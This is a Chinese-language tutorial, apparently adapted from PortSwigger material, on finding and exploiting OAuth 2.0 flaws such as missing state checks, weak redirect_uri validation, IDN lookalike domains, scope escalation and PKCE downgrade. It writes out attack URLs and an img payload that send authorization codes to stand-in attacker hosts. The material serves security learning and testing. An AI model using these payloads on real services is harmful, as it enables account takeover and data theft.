# OAuth 2.0 身份验证漏洞

在浏览网页时，您几乎肯定遇到过允许您使用社交媒体账户登录的网站。这个功能很可能就是使用流行的 OAuth 2.0 框架构建的。OAuth 2.0 对攻击者来说极具吸引力，因为它既非常普遍，又天生容易出现实现错误。这可能导致大量漏洞，使攻击者能够获取敏感用户数据，并可能完全绕过身份验证。

在本节中，我们将教您如何识别和利用 OAuth 2.0 身份验证机制中发现的一些关键漏洞。如果您对 OAuth 身份验证不太熟悉，请不要担心——我们提供了大量背景信息来帮助您理解所需的关键概念。我们还将探讨 OAuth 的 OpenID Connect 扩展中的一些漏洞。最后，我们还提供了一些关于如何保护您自己的应用程序免受此类攻击的指导。

本主题是与 PortSwigger Research 合作编写的，同时还有论文 [Hidden OAuth Attack Vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)。

## 什么是 OAuth？

OAuth 是一种常用的授权框架，使网站和 Web 应用程序能够请求有限访问用户在另一个应用程序上的账户。关键在于，OAuth 允许用户在不向请求应用程序暴露其登录凭据的情况下授予此访问权限。这意味着用户可以精细控制他们想要共享哪些数据，而不必将账户的完全控制权交给第三方。

OAuth 的基本过程被广泛用于集成需要访问用户账户中某些数据的第三方功能。例如，一个应用程序可能使用 OAuth 请求访问您的电子邮件联系人列表，以便它可以推荐可以联系的人。然而，相同的机制也用于提供第三方身份验证服务，允许用户使用他们在另一个网站上的账户登录。

> **注意：** 虽然 OAuth 2.0 是当前标准，但一些网站仍在使用旧版本 1a。OAuth 2.0 是从头开始编写的，而不是直接从 OAuth 1.0 发展而来。因此，两者非常不同。请注意，在本材料中，“OAuth”一词专指 OAuth 2.0。

## OAuth 2.0 如何工作？

OAuth 2.0 最初是作为在应用程序之间共享对特定数据访问权限的一种方式而开发的。它通过定义三个不同方之间的一系列交互来工作，即客户端应用程序、资源所有者和 OAuth 服务提供商。

- **客户端应用程序**——想要访问用户数据的网站或 Web 应用程序。
- **资源所有者**——客户端应用程序想要访问其数据的用户。
- **OAuth 服务提供商**——控制用户数据及其访问权限的网站或应用程序。他们通过提供用于与授权服务器和资源服务器交互的 API 来支持 OAuth。

实际的 OAuth 过程有多种不同的实现方式。这些被称为 OAuth“流程”或“授权类型”。在本主题中，我们将重点关注“授权码”和“隐式”授权类型，因为它们是最常见的。总的来说，这两种授权类型都涉及以下阶段：

1. 客户端应用程序请求访问用户数据的子集，指定他们想要使用的授权类型以及他们想要什么样的访问权限。
2. 提示用户登录 OAuth 服务并明确同意所请求的访问权限。
3. 客户端应用程序收到一个唯一的访问令牌，证明他们有权访问请求的数据。具体发生方式因授权类型而异。
4. 客户端应用程序使用此访问令牌进行 API 调用，从资源服务器获取相关数据。

在学习 OAuth 如何用于身份验证之前，了解这个基本 OAuth 过程的基础知识非常重要。如果您完全是 OAuth 新手，我们建议您在继续阅读之前先熟悉我们将要介绍的两种授权类型的细节。

### OAuth 身份验证

尽管最初并非为此目的而设计，但 OAuth 已经演变为一种认证用户的方式。例如，您可能熟悉许多网站提供的选项，即使用您现有的社交媒体账户登录，而无需在相关网站注册。每当您看到此选项时，很有可能它就是基于 OAuth 2.0 构建的。

对于 OAuth 身份验证机制，基本的 OAuth 流程在很大程度上保持不变；主要区别在于客户端应用程序如何使用它接收到的数据。从最终用户的角度来看，OAuth 身份验证的结果大致类似于基于 SAML 的单点登录（SSO）。在本材料中，我们将专门关注这种类似 SSO 用例中的漏洞。

OAuth 身份验证通常按如下方式实现：

1. 用户在登录界面选择使用其社交媒体账户登录的选项。然后，客户端应用程序使用社交媒体网站的 OAuth 服务请求访问一些可用于识别用户的数据。例如，这可能是与其账户关联的电子邮件地址。
2. 在客户端应用程序收到访问令牌后，从资源服务器请求此数据，通常来自专用的 `/userinfo` 端点。
3. 一旦客户端应用程序收到数据，将其用作用户名来登录用户。它从授权服务器收到的访问令牌通常用于替代传统密码。

您可以在下面的实验中看到一个简单的示例。只需在通过 Burp 代理流量时完成“使用社交媒体账户登录”选项，然后研究代理历史记录中的一系列 OAuth 交互。您可以使用凭据 `wiener:peter` 登录。请注意，此实现故意存在漏洞——我们稍后会教您如何利用它。

## OAuth 身份验证漏洞是如何产生的？

OAuth 身份验证漏洞的产生部分是因为 OAuth 规范在设计上相对模糊和灵活。尽管每种授权类型的基本功能需要少数强制性组件，但绝大部分实现完全是可选的。这包括许多对保护用户数据安全所必需的配置设置。简而言之，不良实践有很多机会渗透进来。

OAuth 的另一个关键问题是一般缺乏内置的安全功能。安全性几乎完全依赖于开发人员使用正确的配置选项组合，并在其之上实施自己的额外安全措施，例如健壮的输入验证。正如您可能已经了解到的，有很多内容需要掌握，如果您对 OAuth 没有经验，这很容易出错。

根据授权类型的不同，高度敏感的数据也通过浏览器发送，这为攻击者拦截提供了各种机会。

## 识别 OAuth 身份验证

识别应用程序何时使用 OAuth 身份验证相对简单。如果您看到使用其他网站的账户登录的选项，这是正在使用 OAuth 的有力迹象。

识别 OAuth 身份验证最可靠的方法是通过拦截代理服务器代理您的流量，并在使用此登录选项时检查相应的 HTTP 消息。无论使用哪种 OAuth 授权类型，流程的第一个请求始终是发送到 `/authorization` 端点的请求，其中包含许多专门用于 OAuth 的查询参数。特别要注意 `client_id`、`redirect_uri` 和 `response_type` 参数。例如，授权请求通常如下所示：

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

## 侦察

对正在使用的 OAuth 服务进行一些基本侦察，可以在识别漏洞时为您指明正确的方向。

不言而喻，您应该研究构成 OAuth 流程的各种 HTTP 交互——我们稍后会介绍一些需要特别注意的具体事项。如果使用外部 OAuth 服务，您应该能够从发送授权请求的主机名中识别出特定的提供商。由于这些服务提供公共 API，通常有详细的文档可用，应该会告诉您各种有用的信息，例如端点的确切名称以及正在使用哪些配置选项。

一旦您知道授权服务器的主机名，您应该始终尝试向以下周知标准端点发送 `GET` 请求：

- `/.well-known/oauth-authorization-server`
- `/.well-known/openid-configuration`

这些通常会返回一个包含关键信息的 JSON 配置文件，例如可能支持的附加功能的详细信息。这有时会让您注意到更广泛的攻击面和文档中可能未提及的支持功能。

### OAuth 客户端应用程序中的漏洞

客户端应用程序通常会使用信誉良好、经过实战考验的 OAuth 服务，这些服务能够很好地防御广泛已知的漏洞。然而，它们自己这边的实现可能不太安全。

正如我们已经提到的，OAuth 规范的定义相对松散。对于客户端应用程序的实现来说尤其如此。OAuth 流程中有很多活动部件，每种授权类型都有许多可选参数和配置设置，这意味着存在很大的配置错误空间。

#### 隐式授权类型的不当实现

由于通过浏览器发送访问令牌所带来的危险，隐式授权类型主要推荐用于单页应用程序。然而，由于其相对简单，它也经常用于经典的客户端-服务器 Web 应用程序。

在此流程中，
1. OAuth 服务器以服务器端重定向的形式，在其中的 hash 片段部分包含访问令牌

    ```http
    HTTP/2 302 Found
    Location: https://应用程序/回调端点#access_token=访问令牌
    ```

2. 然后作为客户端应用程序的浏览器在回调端点返回的页面中使用 JavaScript 访问令牌。

    ```js
    const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
    const token = urlSearchParams.get('access_token');
    ```

问题是，如果应用程序希望在用户关闭页面后保持会话，它需要将当前用户数据（通常是用户 ID 和访问令牌）存储在某个地方。

为了解决这个问题，客户端应用程序通常会通过 `POST` 请求将这些数据提交到服务器，然后为用户分配一个会话 Cookie，从而有效地将其登录。此请求大致相当于经典基于密码的登录中可能发送的表单提交请求。然而，在此场景中，服务器没有任何秘密或密码可以与提交的数据进行比较，这意味着它或许缺乏上下文状态而可被篡改。

在隐式流程中，此 `POST` 请求通过浏览器暴露给攻击者。因此，如果客户端应用程序没有正确检查访问令牌是否与请求中的其他数据匹配，此行为可能导致严重漏洞。在这种情况下，攻击者可以简单地更改发送到服务器的参数以冒充任何用户。

```json
{
  "email":"目标用户的邮件地址",
  "token":"攻击者的有效授权令牌"
}
```

#### 有缺陷的 CSRF 保护

尽管 OAuth 流程的许多组件是可选的，但除非有重要原因不使用它们，否则强烈建议使用其中一些组件。`state` 参数就是一个这样的例子。

`state` 参数理想情况下应包含一个不可猜测的值，例如在首次启动 OAuth 流程时与用户会话相关的某些内容的哈希（即，会话状态的 hash）。然后，此值在客户端应用程序和 OAuth 服务之间来回传递，作为客户端应用程序的一种 CSRF 令牌。因此，如果您注意到授权请求没有发送 `state` 参数，从攻击者的角度来看，这非常有趣。这可能意味着他们可以自己启动 OAuth 流程，然后诱骗用户的浏览器完成它，类似于传统的 CSRF 攻击。根据客户端应用程序如何使用 OAuth，这可能会产生严重后果。

考虑一个网站，允许用户使用经典基于密码的机制登录，或通过使用 OAuth 将其账户链接到社交媒体个人资料来登录。在这种情况下，如果应用程序未能使用会话状态 hash 参数 `state`，攻击者可能通过将受害用户的账户绑定到他们自己的社交媒体账户来劫持其在客户端应用程序上的账户。
- 攻击者获取自己的未使用的有效授权令牌
- 受害者访问攻击者提供的授权账户绑定链接，其中包含攻击者授权令牌
- 受害者浏览器向授权绑定端点提交攻击者的令牌，浏览器自动携带已登录会话 cookie
    - 此时，由于不存在会话状态 hash 参数 `state`，于是应用程序将攻击者的授权账户与受害者的应用程序账户绑定
- 攻击者使用授权账户登录，即访问被绑定的受害者应用程序账户

请注意，如果网站允许用户仅通过 OAuth 登录，`state` 参数可以说不太关键。然而，不使用 `state` 参数仍然可能允许攻击者构造登录 CSRF 攻击，即诱骗用户登录到攻击者的账户。

### 泄露授权码和访问令牌

也许最臭名昭著的基于 OAuth 的漏洞是当 OAuth 服务本身的配置使攻击者能够窃取与其他用户账户关联的授权码或访问令牌时。通过窃取有效的代码或令牌，攻击者可能能够访问受害者的数据。最终，这可能完全破坏他们的账户——攻击者可能能够在此 OAuth 服务注册的任何客户端应用程序上以受害用户身份登录。

根据授权类型的不同，代码或令牌通过受害者的浏览器发送到授权请求的 `redirect_uri` 参数中指定的 `/callback` 端点。如果 OAuth 服务未能正确验证此 URI，攻击者可能能够构造类似 CSRF 的攻击，诱骗受害者的浏览器启动 OAuth 流程，将代码或令牌发送到攻击者控制的 `redirect_uri`。

在授权码流程中，攻击者可以在受害者的代码被使用之前潜在地窃取它。然后，他们可以将此代码发送到客户端应用程序的合法 `/callback` 端点（原始 `redirect_uri`）以访问用户的账户。在此场景中，攻击者甚至不需要知道客户端密钥或由此产生的访问令牌。只要受害者与 OAuth 服务有有效会话，客户端应用程序就会代表攻击者完成代码/令牌交换，然后将他们登录到受害者的账户。

请注意，使用 `state` 或 `nonce` 保护不一定能防止这些攻击，因为攻击者可以从自己的浏览器生成新值。在快速授权流程中（无 POST 确认，全程 GET 与重定向）：
- 攻击者访问应用程序的授权登录端点，获取授权服务器端点的 URL 及其参数
    `https://授权服务器端点?redirect_uri=https://应用程序回调端点&response_type=code`

- 攻击者修改回调 URL 到攻击者主机，之后发送被污染的授权服务器 URL 到受害者
    `https://授权服务器端点?redirect_uri=https://攻击者回调端点&response_type=code`

- 受害者在已登录的状态下触发授权服务器的快速授权，最终携带未被使用的授权令牌访问攻击者主机的回调 URL
    `https://攻击者回调端点?code=授权令牌`

- 攻击者查看攻击服务器 log 获取授权令牌，之后应用此令牌访问应用程序授权端点

更安全的授权服务器在交换代码时也会要求发送 `redirect_uri` 参数。然后服务器可以检查这是否与初始授权请求中收到的匹配，如果不匹配则拒绝交换。由于这是通过安全的后端通道在服务器到服务器请求中发生的，攻击者无法控制这第二个 `redirect_uri` 参数。

#### 有缺陷的 redirect_uri 验证

由于前面实验中看到的那种攻击，最佳实践是客户端应用程序在向 OAuth 服务注册时提供其真实回调 URI 的白名单。这样，当 OAuth 服务收到新请求时，它可以对照此白名单验证 `redirect_uri` 参数。在这种情况下，提供外部 URI 可能会导致错误。然而，可能仍有方法绕过此验证。

在审计 OAuth 流程时，您应该尝试试验 `redirect_uri` 参数以了解它如何被验证。例如：

- 某些实现通过仅检查字符串是否以正确的字符序列开头（即批准的域）来允许一系列子目录。您应该尝试删除或添加任意路径、查询参数和片段，以查看在不触发错误的情况下可以更改什么。
- 如果您可以向默认的 `redirect_uri` 参数附加额外值，您可能能够利用 OAuth 服务不同组件之间 URI 解析的差异。例如，您可以尝试以下技术：
  ```
  https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/
  ```
  见“SSRF”和“CORS”小节
- 您偶尔可能会遇到服务器端参数污染漏洞。以防万一，您应该尝试提交重复的 `redirect_uri` 参数，如下所示：
  ```
  https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
  ```
- 某些服务器也给予 `localhost` URI 特殊处理，因为它们通常在开发期间使用。在某些情况下，任何以 `localhost` 开头的重定向 URI 可能在生产环境中被意外允许。这可能允许您通过注册如 `localhost.evil-user.net` 的域名来绕过验证。

重要的是要注意，您不应将测试局限于仅探测 `redirect_uri` 参数。在实际中，您通常需要尝试对多个参数进行不同组合的更改。有时更改一个参数可能会影响其他参数的验证。例如，将 `response_mode` 从 `query` 更改为 `fragment` 有时可以完全改变 `redirect_uri` 的解析，允许您提交否则会被阻止的 URI。同样，如果您注意到支持 `web_message` 响应模式，这通常允许 `redirect_uri` 中使用更广泛的子域。

##### 通过国际化域名绕过 redirect_uri

[hackerone 报告 2020](https://hackerone.com/reports/861940)

攻击者尝试绕过 `redirect_uri` 白名单的一种方式是使用国际化域名（IDN），如果应用程序未禁止使用非拉丁字符的 URL。IDN 可以使用非拉丁语系的 unicode 字符，使其在视觉上与受信任域相同，即使技术上不同。

- 原始域：`semrush.com`

- 以下所有域名均被视为有效
    ```log
    - sémrush.com
    - sêmrush.com
    - sèmrûsh.com
    - šemrush.com
    - etc.
    ```

授权链接，将载荷域名设置到回调 URL：

`https://oauth.semrush.com/oauth2/authorize?response_type=code&scope=user.info,projects.info,siteaudit.info&client_id=seoquake&redirect_uri=https://oauth.šemrush.com/oauth2/success`

确认后 OAuth 授权码将被发送至 `oauth.šemrush.com`，该域名等价于 `oauth.xn--emrush-9jb.com` —— 因为浏览器会将其转换为 Punycode 版本，这是用 DNS 支持的字符（A-Z，0-9）来表示 IDN 的方式。

攻击者只需为此注册以下域名 `xn--emrush-9jb.com`

> unicode 相似字符漏洞，的确且至今仍然存在

#### 通过代理页面窃取代码和访问令牌

针对更健壮的目标，您可能会发现无论您如何尝试，都无法成功提交外部域作为 `redirect_uri`。然而，这并不意味着是时候放弃了。

到此时，您应该对 URI 的哪些部分可以篡改有了相对较好的了解。关键现在是利用这些知识尝试访问客户端应用程序本身内更广泛的攻击面。换句话说，尝试确定是否可以将 `redirect_uri` 参数更改为指向白名单域上的任何其他页面。

尝试找到可以成功访问不同子域或路径的方法。例如，默认 URI 通常位于 OAuth 特定的路径上，如 `/oauth/callback`，这不太可能有任何有趣的子目录。然而，您可能能够使用目录遍历技巧来提供域上的任意路径。类似这样：

```
https://client-app.com/oauth/callback/../../example/path
```

在后端可能被解释为：

```
https://client-app.com/example/path
```

一旦您确定了能够设置为重定向 URI 的其他页面，您应该审计它们是否存在可能用于泄露代码或令牌的额外漏洞。对于授权码流程，您需要找到能够访问查询参数的漏洞，而对于隐式授权类型，您需要提取 URL 片段（分别对应两种授权类型的返回的令牌位置，hash 片段在重定向过程中保留）。

为此目的最有用的漏洞之一是开放重定向。您可以使用它作为代理，将受害者连同他们的代码或令牌转发到您控制的域，在那里您可以托管任何您喜欢的恶意脚本。

请注意，对于隐式授权类型，窃取访问令牌不仅使您能够登录客户端应用程序上受害者的账户。由于整个隐式流程通过浏览器进行，您还可以使用令牌向 OAuth 服务的资源服务器进行自己的 API 调用。这可能使您能够获取通常无法从客户端应用程序的 Web UI 访问的敏感用户数据。

除了开放重定向之外，您还应该寻找任何其他允许您提取代码或令牌并将其发送到外部域的漏洞。一些好的例子包括：

- **处理查询参数和 URL 片段的危险 JavaScript**  
  例如，不安全的 Web 消息传递脚本对此非常有用。在某些情况下，您可能需要识别更长的 gadget 链，使您能够通过一系列脚本传递令牌，然后最终将其泄露到您的外部域。
  - 如 `otherWindow.postMessage(..., *)` 的无限制跨源通信

- **XSS 漏洞**  
  尽管 XSS 攻击本身可能会产生巨大影响，但在用户关闭标签页或导航离开之前，攻击者通常只有一小段时间窗口可以访问用户的会话。由于 `HTTPOnly` 属性通常用于会话 Cookie，攻击者通常也无法使用 XSS 直接访问它们。然而，通过窃取 OAuth 代码或令牌，攻击者可以在自己的浏览器中访问用户的账户。这给了他们更多时间来探索用户的数据并执行有害操作，显著增加了 XSS 漏洞的严重性。

- **HTML 注入漏洞**  
  在您无法注入 JavaScript 的情况下（例如，由于 CSP 限制或严格过滤），您可能仍然能够使用简单的 HTML 注入来窃取授权码。如果您可以将 `redirect_uri` 参数指向一个您可以注入自己 HTML 内容的页面，您可能能够通过 `Referer` 头泄露代码。例如，考虑以下 `img` 元素：`<img src="evil-user.net">`。在尝试获取此图像时，某些浏览器（如 Firefox）会在请求的 `Referer` 头中发送完整的 URL，包括查询字符串。

### 有缺陷的范围验证

在任何 OAuth 流程中，用户必须根据授权请求中定义的范围批准所请求的访问权限。由此产生的令牌仅允许客户端应用程序访问用户批准的范围。但在某些情况下，由于 OAuth 服务的验证存在缺陷，攻击者可能能够使用额外权限“升级”访问令牌（无论是窃取的还是使用恶意客户端应用程序获得的）。执行此操作的过程取决于授权类型。

#### 范围升级：授权码流程

对于授权码授权类型，用户的数据通过安全的服务器到服务器通信请求和发送，第三方攻击者通常无法直接操纵。然而，仍然可以通过向 OAuth 服务注册自己的客户端应用程序来实现相同的结果。

例如，假设攻击者的恶意客户端应用程序最初使用 `openid email` 范围请求访问用户的电子邮件地址。在用户批准此请求后，恶意客户端应用程序收到一个授权码。由于攻击者控制其客户端应用程序，他们可以向代码/令牌交换请求添加另一个 `scope` 参数，其中包含额外的 `profile` 范围：

```http
POST /token
Host: oauth-authorization-server.com

client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20email%20profile
```

如果服务器没有对照初始授权请求中的范围进行验证，它有时会使用新范围生成一个访问令牌并将其发送到攻击者的客户端应用程序：

```json
{
    "access_token": "z0y9x8w7v6u5",
    "token_type": "Bearer",
    "expires_in": 3600,
    "scope": "openid email profile",
    …
}
```

然后攻击者可以使用其应用程序进行必要的 API 调用来访问用户的个人资料数据。

#### 范围升级：隐式流程

对于隐式授权类型，访问令牌通过浏览器发送，这意味着攻击者可以窃取与合法客户端应用程序关联的令牌并直接使用它们。一旦窃取了访问令牌，他们可以向 OAuth 服务的 `/userinfo` 端点发送正常的基于浏览器的请求，并在此过程中手动添加新的 `scope` 参数。

理想情况下，OAuth 服务应验证此 `scope` 值是否与生成令牌时使用的值匹配，但这并不总是如此。只要调整后的权限不超过先前授予此客户端应用程序的访问级别，攻击者就可以在无需用户进一步批准的情况下访问额外数据。

### 未经验证的用户注册

在通过 OAuth 认证用户时，客户端应用程序隐式地假设 OAuth 提供商存储的信息是正确的。这可能是一个危险的假设。

一些提供 OAuth 服务的网站允许用户在未验证所有详细信息（包括在某些情况下其电子邮件地址）的情况下注册账户。攻击者可以利用这一点，使用与目标用户相同的详细信息（如已知的电子邮件地址）在 OAuth 提供商处注册账户。然后，客户端应用程序可能允许攻击者通过此欺诈性账户以受害者身份使用 OAuth 提供商登录。

## 使用 OpenID Connect 扩展 OAuth

当用于身份验证时，OAuth 通常通过 OpenID Connect 层进行扩展，该层提供了与识别和认证用户相关的一些额外功能。有关这些功能的详细说明，以及一些与它们可能引入的漏洞相关的更多实验，请参阅 `OpenID Connect` 主题。

## 测试 PKCE 降级攻击

在某些情况下，PKCE 扩展可以从授权码流程中移除。这可能导致公共客户端容易受到 PKCE 扩展本应缓解的攻击。

这种情况可能发生在：

- AS 不支持 PKCE。
- AS 未正确验证 PKCE。

两者都可以使用 HTTP 拦截代理（如 ZAP）进行测试。执行以下测试：

1. 发送不带 `code_challenge=sha256(xyz)` 和 `code_challenge_method` 参数的授权请求。
2. 发送带有空 `code_challenge=sha256(xyz)` 参数值的授权请求。
3. 发送带有伪造 `code_challenge=sha256(xyz)` 参数值的授权请求。

以下示例突出显示了要修改的值：

```http
GET /authorize
    ?redirect_uri=http%3A%2F%client.example.com
    &client_id=example-client
    &errorPath=%2Ferror
    &scope=openid%20profile%20email
    &response_type=code
    &response_mode=web_message
    &state=example-state
    &nonce=example-nonce
    &code_challenge=MODIFY_OR_OMIT_THIS
    &code_challenge_method=MODIFY_OR_OMIT_THIS
    &prompt=none HTTP/1.1
Host: as.example.com
```

AS 应验证令牌交换中的 `code_verifier` 值。进行以下测试：

1. 发送不带 `code_verifier` 的令牌请求。
2. 发送带有空 `code_verifier` 的令牌请求。
3. 发送带有针对不同授权码的有效 `code_verifier` 的令牌请求。

```http
POST /oauth/token HTTP/1.1
Host: as.example.com

{
"client_id":"example-client",
"code_verifier":"MODIFY_OR_OMIT_THIS",
"code":"example",
"grant_type":"authorization_code",
"redirect_uri":"https://client.example.com"
}
```
